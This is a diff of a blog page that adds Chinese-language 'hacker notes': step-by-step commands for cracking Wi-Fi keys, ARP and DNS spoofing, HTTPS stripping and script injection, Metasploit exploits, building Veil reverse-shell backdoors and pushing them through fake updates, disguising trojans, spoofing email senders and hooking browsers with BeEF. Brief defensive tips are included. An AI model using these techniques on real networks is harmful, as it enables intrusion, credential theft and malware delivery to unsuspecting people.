@@ -6,20 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hello World | 一始之心</title>
+  <title>黑客笔记 | 一始之心</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="博客搬家啦，慢慢把各个平台的博客汇聚起来，记录自己成长道路上的收获和感悟">
-<meta name="keywords" content="杂记">
+  <meta name="description" content="[toc] 网络入侵1.1 前期准备购买了Atheros 7291的无线网卡，插入到kali Linux上，执行以下命令启动网卡的启动监听模式： ifconfig wlan0 down airmon-ng check kill iwconfig wlan0 monitor #启动监听模式 ifconfig wlan0 up 1.2 破解网络####1.2.1 破解WEP秘钥  破解原理WEP网络发">
+<meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2018/08/05/hello-world/index.html">
+<meta property="og:title" content="黑客笔记">
+<meta property="og:url" content="http://yoursite.com/2020/07/10/黑客笔记/index.html">
 <meta property="og:site_name" content="一始之心">
-<meta property="og:description" content="博客搬家啦，慢慢把各个平台的博客汇聚起来，记录自己成长道路上的收获和感悟">
+<meta property="og:description" content="[toc] 网络入侵1.1 前期准备购买了Atheros 7291的无线网卡，插入到kali Linux上，执行以下命令启动网卡的启动监听模式： ifconfig wlan0 down airmon-ng check kill iwconfig wlan0 monitor #启动监听模式 ifconfig wlan0 up 1.2 破解网络####1.2.1 破解WEP秘钥  破解原理WEP网络发">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-02-01T05:06:45.005Z">
+<meta property="og:updated_time" content="2021-02-01T12:20:46.787Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="博客搬家啦，慢慢把各个平台的博客汇聚起来，记录自己成长道路上的收获和感悟">
+<meta name="twitter:title" content="黑客笔记">
+<meta name="twitter:description" content="[toc] 网络入侵1.1 前期准备购买了Atheros 7291的无线网卡，插入到kali Linux上，执行以下命令启动网卡的启动监听模式： ifconfig wlan0 down airmon-ng check kill iwconfig wlan0 monitor #启动监听模式 ifconfig wlan0 up 1.2 破解网络####1.2.1 破解WEP秘钥  破解原理WEP网络发">
   
     <link rel="alternative" href="/atom.xml" title="一始之心" type="application/atom+xml">
   
@@ -149,27 +149,244 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-黑客笔记" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      黑客笔记
     </h1>
   
 
         
-        <a href="/2018/08/05/hello-world/" class="archive-article-date">
-  	<time datetime="2018-08-05T05:09:53.642Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-05</time>
+        <a href="/2020/07/10/黑客笔记/" class="archive-article-date">
+  	<time datetime="2020-07-10T11:43:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-10</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>博客搬家啦，慢慢把各个平台的博客汇聚起来，记录自己成长道路上的收获和感悟</p>
+        <p>[toc]</p>
+<h2 id="网络入侵"><a href="#网络入侵" class="headerlink" title="网络入侵"></a>网络入侵</h2><h3 id="1-1-前期准备"><a href="#1-1-前期准备" class="headerlink" title="1.1 前期准备"></a>1.1 前期准备</h3><p>购买了Atheros 7291的无线网卡，插入到kali Linux上，执行以下命令启动网卡的启动监听模式：</p>
+<pre><code>ifconfig wlan0 down
+airmon-ng check kill
+iwconfig wlan0 monitor #启动监听模式
+ifconfig wlan0 up
+</code></pre><h3 id="1-2-破解网络"><a href="#1-2-破解网络" class="headerlink" title="1.2 破解网络"></a>1.2 破解网络</h3><p>####1.2.1 破解WEP秘钥</p>
+<ul>
+<li>破解原理<br>WEP网络发送的每一个包都经过加密形成Key Stream<br>Key Stream由24bit的ramdom initializaiton vector(IV)+password生成。</li>
+<li><p>攻击方式<br>捕获网络上的包，如果没有包，就进行arp replay,迫使目标路由器和我们握手，从而捕获生成的握手包</p>
+<pre><code># Fake Athentication Attack 0 一次
+aireplay-ng --fakeauth 0 目标MAC -h 网卡MAC wlan0 
+# arp reqyest replay
+aireplay-ng --arpreplau 0 -b 目标mac -h 网卡mac wlan0
+# 从捕获到的包中获取key
+aircrack-ng arpreplay-01.cap
+</code></pre><p>####1.2.2 破解WPA/WPA2秘钥</p>
+</li>
+<li>破解原理</li>
+</ul>
+<ol>
+<li>基于WPS特性<br>WPS允许客户端在没有密码的情况下连接到网络认证只使用了8位的pin码，所以暴力破解pin码</li>
+<li>字典破解<br>如果网络的WPS特性关闭，只能使用字典攻击了。并且默认来说WPS都是关闭的，字典破解是更常用的方式。</li>
+</ol>
+<ul>
+<li>具体操作<br>###1.3 攻击方式拾遗</li>
+<li>Deauthentication Attack</li>
+<li>APR request Replay Attack</li>
+</ul>
+<h2 id="信息搜集和中间人攻击"><a href="#信息搜集和中间人攻击" class="headerlink" title="信息搜集和中间人攻击"></a>信息搜集和中间人攻击</h2><h3 id="2-1-Zenmap-amp-Nmap"><a href="#2-1-Zenmap-amp-Nmap" class="headerlink" title="2.1 Zenmap&amp;Nmap"></a>2.1 Zenmap&amp;Nmap</h3><p>使用zenmap的quick scan plus，可以获取网络中的设备，运行的操作系统，开放的端口，端口运行的软件。从而可以搜索对应软件存在的漏洞进行攻击。<br>例子：Iphone越狱后会开启22端口，可以远程ssh登录。root的默认密码是alpine，值得一试。</p>
+<p>###2.2 ARP spoof(ARP poision)<br>ARP欺骗，中间人攻击<br>因为ARP没有安全检验机制<br>使用arpspoof让目标机器以为攻击者的机器是路由器，让路由器以为攻击者的机器是目标机器。<br>先开启流量转发：</p>
+<pre><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward
+命令：arpspoof -i 网卡名 -t 目标机器IP 让目标机器认为我们是谁的IP
+arp -a查看本地的arp表
+</code></pre><p>###2.3 bettercap 中间人攻击<br>也可用于arp欺骗，功能比arpspoof强大<br>命令：</p>
+<pre><code>bettercap -itface wlan0
+ 进入之后的命令：
+help帮助，能查看运行的模块
+net.probe给同一网段的设备发UDP请求
+，搜集设备信息，会自动开启net.recon
+查看搜集的结果：net.show
+开启arp欺骗：
+- set arp.spoof.fulduplex  true #让目标机器和路由器都认为我是中间人
+- set arp.spoof.targets 1.0.2.15 #目标机器
+- arp.spoof on
+-ney.sniff on开启监听，可以捕获所有的请求(吊爆了)
+</code></pre><p>可以把以上命令都写入脚本</p>
+<pre><code>bettercap -itface wlan0 caplet xxxxx.cap
+</code></pre><p>上述命令只能捕获未加密的HTTP请求，想获得HTTPS的信息，需要额外的步骤：</p>
+<pre><code>1. 下载htshjack解压到/usr/share/bettercap/caplets
+2. 脚本中，在开始sniff前增加
+set net.sniff.local true
+3.运行脚本即可开始捕获(吊爆了)
+</code></pre><p>###2.4 部分解决hsts问题<br>hsts：一部分网页</p>
+<h3 id="2-5-DNS欺骗"><a href="#2-5-DNS欺骗" class="headerlink" title="2.5 DNS欺骗"></a>2.5 DNS欺骗</h3><pre><code>1.先执行上述脚本，开启相关模块
+2. set dns.spoof.domain xxx 设置想要查访问的人骗到xxx去，不设置的话默认是网卡地址
+3.set dns.spoof.all true 是否把所有请求都骗过去
+set dns.spoof.domains xxx,xxx逗号分割的域名，访问xxx时会欺骗
+4.dns.spoof.on
+注入javascript脚本：
+1.同上，执行脚本，启动相关服务
+2.把js代码保存到foo.js
+3.打开hstshijack模块，修改hijack.cap
+4.在set hstshijack.payloads 之后增加*:/path/to/foo.js
+5.运行hijack模块: hstshijack/hstshijack
+</code></pre><h3 id="2-6Wireshark"><a href="#2-6Wireshark" class="headerlink" title="2.6Wireshark"></a>2.6Wireshark</h3><p>不是用来攻击的工具，只能监听本地网卡。但是通过arp欺骗。可以捕获别人的流量，从而分析监听别人的网络<br>简单使用：</p>
+<ul>
+<li>过滤http(绿色)</li>
+<li>查看http内容</li>
+<li>搜索http内容</li>
+</ul>
+<h3 id="2-7-把自己伪装成热点"><a href="#2-7-把自己伪装成热点" class="headerlink" title="2.7 把自己伪装成热点"></a>2.7 把自己伪装成热点</h3><p>伪装成热点后，对接入的victims自动成中间人<br>使用start-nat-simple.sh，再启动bettercap(另外的启动命令不实用，先忽略了)，或者使用wireshark抓包<br>使用工具mana</p>
+<ol>
+<li>编辑mana的配置文件/etc/mana-toolkit/hostapd-mana.conf，修改想要使用无线网卡名字，和ssid</li>
+<li>编辑启动文件/usr/share/mana-toolkit/run-mana/start-mana-simole.sh，修改phy为无线网卡，upstream为可以联网的另一个网卡</li>
+<li>运行</li>
+</ol>
+<h2 id="检测攻击"><a href="#检测攻击" class="headerlink" title="检测攻击"></a>检测攻击</h2><p>###3.1 检测arp欺骗：<br>1.使用XR工具<br>2.使用wireshark抓包<br>3.使用static arptable</p>
+<p>###3.2 防止中间人攻击：<br>1.使用https everywhere插件<br>2.使用vnp，vpn会加密。但是vpn提供商会获取你的全部通讯，所以要选择可信的供应商。</p>
+<p>##获取权限</p>
+<ul>
+<li>server side attack<br>只需要ip就可以进行攻击，使用端口扫描等</li>
+<li>client side attack<br>需要和服务器通信，上传，社会工程，引诱安装木马等</li>
+</ul>
+<h3 id="4-1-初体验"><a href="#4-1-初体验" class="headerlink" title="4.1 初体验"></a>4.1 初体验</h3><p>使用zenmap扫描端口，然后去谷歌搜索端口的漏洞，默认密码等，加以利用，本例使用了rlogin</p>
+<h3 id="4-2-metasploit"><a href="#4-2-metasploit" class="headerlink" title="4.2 metasploit"></a>4.2 metasploit</h3><p>由rapid7开发的渗透软件</p>
+<pre><code>msfcosole运行metasploit
+use /path/to/exploit 使用漏洞模块(可以在rapid7网站上搜索)
+show options显示选项，其中name对应的vakue可以通过options进行设置
+set xx xx设置选项
+exploit 执行漏洞
+# 本例使用了vstftp的后门(backdoor)，对21端口进行连接。能够连接ftp后执行代码
+</code></pre><h3 id="4-2-远程执行漏洞"><a href="#4-2-远程执行漏洞" class="headerlink" title="4.2 远程执行漏洞"></a>4.2 远程执行漏洞</h3><p>本例对运行在139端口的samba进行攻击</p>
+<pre><code>use xxxx
+show options
+set rhost 10.200.1.5
+show payloads(payloads意思是可执行的代码片段)
+</code></pre><ul>
+<li>payloads有两类，一类是命名为bind_xxx的，是在目标机器上开启端口并与其通讯。reverse_xx的是在自己机器上开启端口，让远程机器与自己通讯。优点是不会被目标机器的防火墙拦截。<br>可以把自己的端口设置成80让远程机器再访问浏览器呢</li>
+</ul>
+<h3 id="4-3-nexpose"><a href="#4-3-nexpose" class="headerlink" title="4.3 nexpose"></a>4.3 nexpose</h3><p>同样为rapid7开发的渗透工具，可以检测更大范围的漏洞，并且汇报给对应的人员</p>
+<pre><code>安装
+1下载
+2service stop postgresql
+3赋予执行权限
+4执行安装
+</code></pre><ul>
+<li><p>安装过程中，如果遇到不支持kali1，需要kali2的问题，需要升级lunix的/etc/lsb-release和/etc/os-release，先备份，修改自己的版本为kali2，安装完成后再恢复备份</p>
+</li>
+<li><p>安装后可以用来扫描所有漏洞，自动在rapid7上发现攻击方法，生成报告</p>
+</li>
+</ul>
+<h3 id="4-4-Client-side-attack"><a href="#4-4-Client-side-attack" class="headerlink" title="4.4 Client side attack"></a>4.4 Client side attack</h3><p>apt-get install veil</p>
+<h3 id="4-5-veil用于给系统留后门"><a href="#4-5-veil用于给系统留后门" class="headerlink" title="4.5 veil用于给系统留后门"></a>4.5 veil用于给系统留后门</h3><p>运行之后可以看到evasion模块<br>evasion模块命名一般为<br>语言名/payload名/rev</p>
+<p>例子:<br>go/meterpreter/rev_http</p>
+<ul>
+<li>带rev的意思是受害者连接本地</li>
+</ul>
+<p>例子：使用veil留后门</p>
+<p>运行后执行：</p>
+<pre><code>list  #列出所有可用的工具
+use 1 #使用1 ecasion
+use 15 #使用15 go的http——rev
+ifconfig #查看kali的的ip
+set LHOST ${kali_ip}   
+set LPORT ${kali_port}
+set PROCESSORS 1 #使用的最小cpu数
+set SLEEP 6 #睡眠6秒
+
+# 然后生成backdoor:
+generate
+# 命名之后可以获得exe文件
+</code></pre><h3 id="4-6-使用metaexplit监听来自veil的连接"><a href="#4-6-使用metaexplit监听来自veil的连接" class="headerlink" title="4.6 使用metaexplit监听来自veil的连接"></a>4.6 使用metaexplit监听来自veil的连接</h3><pre><code>go/meteptrter/rev_htps,port 8080
+msfconsole
+use exploit/multi/handler #监听incoming connections
+show options
+set LHOST
+set LPORT
+set payload windows/meterpreter/reverse_https  # &lt;-payload和veil中使用的保持一致
+</code></pre><ul>
+<li>/var/wwww/html中储存kali作为服务器时可以下载的内容</li>
+</ul>
+<p>###4.7 诱导victim安装后门：</p>
+<pre><code>#启动
+cd opt/evilgrade
+./evilgrade
+
+show modules
+#可以看到很多软件的虚假升级组件
+
+configure [module_name] #（设置module_name的配置）
+show options #其中的virtualHost是该模块的域名，使用dns欺骗的时候要替换成改属性，本例是update.speedit.com
+set agent /var/www/html/backdoor.exe #设置后门的路径
+set endsite 222.speedbit.com #设置升级之后返回的页面
+start
+
+#开始等待连接了
+
+
+#然后需要成为中间人
+
+bettercap -iface eth0 -caplet /path/to/script
+set dns.spoof.all true
+set dsn.spoof.domain update.speedit.com
+set dns.spoof on
+</code></pre><p>受害人如果更新该软件就会上钩</p>
+<h3 id="4-7plus-另一种让受害人上钩的方法"><a href="#4-7plus-另一种让受害人上钩的方法" class="headerlink" title="4.7plus 另一种让受害人上钩的方法"></a>4.7plus 另一种让受害人上钩的方法</h3><pre><code>/opt/BDFProxy
+
+# 更改cfg：
+proxyMode:transparent
+# 更改配置文件中的HOST为本机IP（本例想对windows系统进行攻击，所以选择[[ windowsIntelx86]] [[windowsx64]]对应的配置）
+# 执行bdf_proxy.py
+
+# 成为中间人进行arp欺骗
+bettercap -iface eth0 -caplet /path/to/script
+
+#配置本地的防火墙转发规则
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 #-t 表名 -A append -p package类型
+#把访问80的请求转发到8080
+msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc
+#如果下载内容则会连接到msfconsole
+</code></pre><p>###4.8 如何防范攻击</p>
+<ul>
+<li>确定没有中间人</li>
+<li>只从http下载</li>
+<li>检查下载文件的MD5文件</li>
+</ul>
+<h2 id="基于社会工程学搜集密码"><a href="#基于社会工程学搜集密码" class="headerlink" title="基于社会工程学搜集密码"></a>基于社会工程学搜集密码</h2><h3 id="5-1-使用工具：maltego"><a href="#5-1-使用工具：maltego" class="headerlink" title="5.1 使用工具：maltego"></a>5.1 使用工具：maltego</h3><ul>
+<li>拖拽人物，网站等建立transformation，自动挖掘个人信息</li>
+</ul>
+<h3 id="5-2-使用Autoit"><a href="#5-2-使用Autoit" class="headerlink" title="5.2 使用Autoit"></a>5.2 使用Autoit</h3><p>把脚本伪装成任意文件，脚本先下载图片，再下载木马，直接执行看起来就是打开了一个图片。<br>使用rw-desinger(网页)把图片转成icon，让木马看起来像是图片</p>
+<p>###5.3 使用characters伪装扩展名</p>
+<p>使用right ro left extension<br>光标后面的内容会被反过来复制成一个字符<br>文件名以(ex结尾为妙，比如hex,sex)<br>有的浏览器会去掉反写，所以最好把文件压缩一下再发送</p>
+<p>###5.4 使用senditblue网站发送假邮件<br>1.先去senditblue注册<br>2.在kali使用sendemail<br>3.sendemail –help<br>4.设置用户名，密码等<br>    sendemail -u [在senditblue注册的邮箱] -xp 密码 -s smtp-relapu.senditblue.com:5787(服务器) -t “<a href="mailto:m.astarg@isecurity.com" target="_blank" rel="noopener">m.astarg@isecurity.com</a>“(收件人) -f “<a href="mailto:zaid@isecurity.com" target="_blank" rel="noopener">zaid@isecurity.com</a>“(发件人,在发件人处伪装发件人) -u [邮件标题] -m [邮件内容] -o message-header “From: Mohanmmad Askar <a href="mailto:&#x6d;&#x2e;&#97;&#x73;&#116;&#x61;&#x72;&#x67;&#64;&#105;&#115;&#x65;&#x63;&#117;&#114;&#x69;&#116;&#121;&#x2e;&#x63;&#111;&#109;" target="_blank" rel="noopener">&#x6d;&#x2e;&#97;&#x73;&#116;&#x61;&#x72;&#x67;&#64;&#105;&#115;&#x65;&#x63;&#117;&#114;&#x69;&#116;&#121;&#x2e;&#x63;&#111;&#109;</a>“(邮箱里显示的姓名）</p>
+<h2 id="获取权限-ex"><a href="#获取权限-ex" class="headerlink" title="获取权限-ex"></a>获取权限-ex</h2><h3 id="6-1-beEf"><a href="#6-1-beEf" class="headerlink" title="6.1 beEf"></a>6.1 beEf</h3><p>基于js的钩子，能让上钩的人在beEf控制台被控制</p>
+<ul>
+<li>常用方法</li>
+</ul>
+<ol>
+<li>基于中间人：使用之前的方法，使用bettercap成为中间人并注入js代码</li>
+<li>DNS欺骗，如以前的方法，返回假页面</li>
+<li>社会工程，诱导打开页面</li>
+</ol>
+<ul>
+<li>BeEF基本操作<br>界面上都有，自己看吧，截屏，摄像头什么的<br>举例：</li>
+</ul>
+<ol>
+<li>发送假的session time out页面进行社会工程学偷密码</li>
+<li>发送假的升级信息，连接指向之前制作的木马软件</li>
+</ol>
+<h3 id="6-2-如何防止木马："><a href="#6-2-如何防止木马：" class="headerlink" title="6.2 如何防止木马："></a>6.2 如何防止木马：</h3><ol>
+<li>右键查看详情检查文件类型</li>
+<li>查看电脑进程有没有可疑的，了解到不明ip的，搜索ip使用reverse dns(网上的服务)</li>
+<li>使用sandbox(沙箱环境)，模拟运行，也可以使用网上的服务(比如hybrid-analysis.com)</li>
+</ol>
+<h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><h3 id="7-1-综述"><a href="#7-1-综述" class="headerlink" title="7.1 综述"></a>7.1 综述</h3><ul>
+<li>由于在内网的设备的IP不暴露到公网，需要在网络的路由器上设置转发，才能让上钩的受害者连接到本地<h3 id="7-2-步骤"><a href="#7-2-步骤" class="headerlink" title="7.2 步骤"></a>7.2 步骤</h3></li>
+</ul>
 
       
 
@@ -204,7 +421,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">杂记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
         		</li>
       		
 		</ul>
@@ -260,7 +477,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/08/05/hello-world/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/07/10/黑客笔记/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -274,15 +491,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/08/05/CDH，HDP，Apache Hadoop之间的关系/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/02/01/TCP-IP笔记/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          CDH，HDP，Apache Hadoop之间的关系
+          TCP/IP笔记
         
       </div>
     </a>
   
+  
+    <a href="/2018/09/10/大数据笔记/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">大数据笔记</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
